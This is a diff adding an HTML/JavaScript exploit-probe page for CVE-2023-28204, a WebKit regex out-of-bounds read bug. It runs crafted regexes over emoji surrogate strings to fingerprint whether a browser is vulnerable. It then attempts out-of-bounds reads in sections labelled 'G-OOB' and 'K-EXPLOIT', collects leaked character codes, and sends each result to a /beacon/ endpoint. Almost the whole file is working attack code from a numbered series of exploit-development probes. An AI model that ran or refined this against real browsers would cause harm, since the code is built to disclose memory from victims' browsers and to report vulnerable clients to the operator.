@@ -1,0 +1,247 @@
+<!--
+  p628: CVE-2023-28204 — isolate the T9-VULN signal from p627
+
+  p627 T9 showed 41 exec matches instead of 21 on a 20-emoji string.
+  But T9 had manual `lastIndex++` which may interfere with the engine's
+  own AdvanceStringIndex for the `u` flag. This probe:
+
+  A) exec loop WITHOUT manual lastIndex++ (engine-only advance)
+  B) exec loop WITH manual lastIndex++ (p627 repro)
+  C) exec loop WITHOUT `u` flag (baseline)
+  D) matchAll() if available
+  E) replace() callback count (p627 T1 confirmed patched, but recheck)
+  F) If OOB confirmed: extract leaked bytes via callback offset/groups
+
+  CRASH_CLASS: LOW
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p628</title></head>
+<body>p628: regex OOB isolate
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+var L = document.getElementById('log');
+var bQ = [];
+
+function emit(tag, msg) {
+  var s = tag + ' ' + (msg || '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 5) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 10).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P628-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+try {
+emit('START', navigator.userAgent ? navigator.userAgent.slice(0,60) : 'no-ua');
+
+var emoji = String.fromCodePoint(0x1F600);
+var N = 20;
+var str = emoji.repeat(N);
+emit('SETUP', 'emoji=U+1F600 N=' + N + ' strlen=' + str.length + ' codeunits=' + str.length);
+
+// ================================================================
+// A: exec loop, engine-only advance (NO manual lastIndex++)
+// With `u` flag, engine should AdvanceStringIndex by 2 for surrogates
+// Expected: 21 matches (one per code point + end)
+// ================================================================
+var reA = /(?!(?=^a|()+()+x)(abc))/gmu;
+var cntA = 0, offA = [], m;
+while ((m = reA.exec(str)) !== null) {
+  cntA++;
+  offA.push(m.index);
+  if (cntA > 80) break;
+}
+emit('A-ENGINE', 'count=' + cntA + ' exp=21 offsets=' + offA.slice(0,30).join(','));
+if (cntA !== 21) emit('A-DELTA', 'extra=' + (cntA - 21));
+
+// Check if offsets step by 2 (correct) or 1 (buggy)
+var stepA = [];
+for (var i = 1; i < Math.min(offA.length, 10); i++) stepA.push(offA[i] - offA[i-1]);
+emit('A-STEPS', stepA.join(',') + (stepA.length > 0 ? ' (exp=2,2,2,...)' : ''));
+
+// ================================================================
+// B: exec loop WITH manual lastIndex++ (p627 T9 repro)
+// ================================================================
+var reB = /(?!(?=^a|()+()+x)(abc))/gmu;
+var cntB = 0, offB = [];
+while ((m = reB.exec(str)) !== null) {
+  cntB++;
+  offB.push(m.index);
+  if (cntB > 80) break;
+  if (m[0].length === 0) reB.lastIndex++;
+}
+emit('B-MANUAL', 'count=' + cntB + ' exp=21 offsets=' + offB.slice(0,30).join(','));
+if (cntB !== 21) emit('B-DELTA', 'extra=' + (cntB - 21));
+
+var stepB = [];
+for (var i = 1; i < Math.min(offB.length, 10); i++) stepB.push(offB[i] - offB[i-1]);
+emit('B-STEPS', stepB.join(','));
+
+// ================================================================
+// C: exec loop WITHOUT `u` flag (baseline — no unicode awareness)
+// Without `u`, engine advances by 1 code unit always
+// Expected: 41 matches (one per code unit + end)
+// ================================================================
+var reC = /(?!(?=^a|()+()+x)(abc))/gm;
+var cntC = 0, offC = [];
+while ((m = reC.exec(str)) !== null) {
+  cntC++;
+  offC.push(m.index);
+  if (cntC > 80) break;
+  if (m[0].length === 0) reC.lastIndex++;
+}
+emit('C-NOFLAG', 'count=' + cntC + ' exp=41 offsets=' + offC.slice(0,10).join(','));
+
+// ================================================================
+// D: Simple regex without the complex negative lookahead
+// Tests if the surrogate advancement bug is in the general exec path
+// ================================================================
+var reD = /(?:)/gmu;
+var cntD = 0, offD = [];
+while ((m = reD.exec(str)) !== null) {
+  cntD++;
+  offD.push(m.index);
+  if (cntD > 80) break;
+  if (m[0].length === 0) reD.lastIndex++;
+}
+emit('D-SIMPLE', 'count=' + cntD + ' exp=21 offsets=' + offD.slice(0,15).join(','));
+if (cntD !== 21) emit('D-DELTA', 'extra=' + (cntD - 21));
+
+var stepD = [];
+for (var i = 1; i < Math.min(offD.length, 10); i++) stepD.push(offD[i] - offD[i-1]);
+emit('D-STEPS', stepD.join(','));
+
+// ================================================================
+// E: Engine-only with simple empty regex (no manual advance)
+// If this gives 41, the engine's AdvanceStringIndex is broken for `u`
+// ================================================================
+var reE = /(?:)/gmu;
+var cntE = 0, offE = [];
+while ((m = reE.exec(str)) !== null) {
+  cntE++;
+  offE.push(m.index);
+  if (cntE > 80) break;
+}
+emit('E-PURE', 'count=' + cntE + ' exp=21');
+if (cntE !== 21) emit('E-DELTA', 'extra=' + (cntE - 21));
+
+var stepE = [];
+for (var i = 1; i < Math.min(offE.length, 10); i++) stepE.push(offE[i] - offE[i-1]);
+emit('E-STEPS', stepE.join(',') + ' (exp=2,2,2,...)');
+
+// ================================================================
+// F: replace() count check (should be patched per p627 T1)
+// ================================================================
+var cntF = 0;
+str.replace(/(?!(?=^a|()+()+x)(abc))/gmu, function() { cntF++; return '|'; });
+emit('F-REPLACE', 'count=' + cntF + ' exp=' + (N + 1));
+
+// ================================================================
+// G: If engine advance is buggy, try OOB read via longer string
+// Build a string, allocate adjacent buffers, see if exec reads past end
+// ================================================================
+var target = emoji.repeat(50);
+var sentinel = 'AAAA'.repeat(100);  // adjacent heap
+var oobChars = [];
+var maxOff = 0;
+
+var reG = /(?!(?=^a|()+()+x)(abc))/gmu;
+while ((m = reG.exec(target)) !== null) {
+  if (m.index > maxOff) maxOff = m.index;
+  if (m.index >= target.length) {
+    var cc = target.charCodeAt(m.index);
+    oobChars.push({off: m.index, cc: isNaN(cc) ? -1 : cc});
+  }
+  if (reG.lastIndex > target.length + 10) break;
+  if (m.index > target.length + 50) break;
+}
+emit('G-OOB', 'maxOff=' + maxOff + ' strlen=' + target.length + ' oob=' + oobChars.length);
+for (var i = 0; i < Math.min(oobChars.length, 10); i++) {
+  emit('G-LEAK', 'off=' + oobChars[i].off + ' cc=' + oobChars[i].cc);
+}
+
+// ================================================================
+// H: matchAll if available
+// ================================================================
+if (typeof str.matchAll === 'function') {
+  try {
+    var reH = /(?!(?=^a|()+()+x)(abc))/gmu;
+    var iter = str.matchAll(reH);
+    var cntH = 0, offH = [];
+    var r;
+    while (!(r = iter.next()).done) {
+      cntH++;
+      offH.push(r.value.index);
+      if (cntH > 80) break;
+    }
+    emit('H-MATCHALL', 'count=' + cntH + ' exp=21 offsets=' + offH.slice(0,15).join(','));
+    if (cntH !== 21) emit('H-DELTA', 'extra=' + (cntH - 21));
+  } catch(e) { emit('H-ERR', String(e).slice(0,80)); }
+} else {
+  emit('H-ABSENT', 'matchAll not available');
+}
+
+// ================================================================
+// I: BOL assertion specific test — the readChecked() bug
+// multiline ^ should match at line starts only, not mid-surrogate
+// ================================================================
+var lines = emoji.repeat(5) + '\n' + emoji.repeat(5) + '\n' + emoji.repeat(5);
+var reI = /^/gmu;
+var cntI = 0, offI = [];
+while ((m = reI.exec(lines)) !== null) {
+  cntI++;
+  offI.push(m.index);
+  if (cntI > 50) break;
+  if (m[0].length === 0) reI.lastIndex++;
+}
+emit('I-BOL', 'count=' + cntI + ' exp=3 offsets=' + offI.join(','));
+if (cntI !== 3) emit('I-BOL-VULN', 'extra=' + (cntI - 3) + ' (readChecked bug?)');
+
+// J: EOL assertion
+var reJ = /$/gmu;
+var cntJ = 0, offJ = [];
+while ((m = reJ.exec(lines)) !== null) {
+  cntJ++;
+  offJ.push(m.index);
+  if (cntJ > 50) break;
+  if (m[0].length === 0) reJ.lastIndex++;
+}
+emit('J-EOL', 'count=' + cntJ + ' exp=3 offsets=' + offJ.join(','));
+
+// ================================================================
+// K: The actual exploitation path — replace callback with BOL
+// If readChecked() advances position inside a surrogate pair,
+// subsequent matches see corrupted state. Check offset > strlen
+// ================================================================
+var kStr = emoji.repeat(100);
+var kLeaked = [];
+kStr.replace(/^(.?)/gmu, function(m, g1, off, full) {
+  if (off > kStr.length) {
+    kLeaked.push({off: off, g1_cc: g1.charCodeAt(0), g1_len: g1.length});
+  }
+  // Check if g1 captured something unexpected
+  if (g1.length > 0) {
+    var cc = g1.charCodeAt(0);
+    if (cc !== 0xD83D && cc !== 0xDE00 && cc !== 0x0A) {
+      kLeaked.push({off: off, cc: cc, type: 'unexpected-capture'});
+    }
+  }
+  return m;
+});
+emit('K-EXPLOIT', 'leaks=' + kLeaked.length);
+for (var i = 0; i < Math.min(kLeaked.length, 10); i++) {
+  var kl = kLeaked[i];
+  emit('K-DATA', 'off=' + kl.off + ' cc=0x' + (kl.cc || kl.g1_cc || 0).toString(16) + ' ' + (kl.type || ''));
+}
+
+emit('ALIVE', 'all tests complete');
+flush();
+} catch(e) { emit('FATAL', String(e).slice(0,200)); flush(); }
+})();
+</script>
+</body></html>
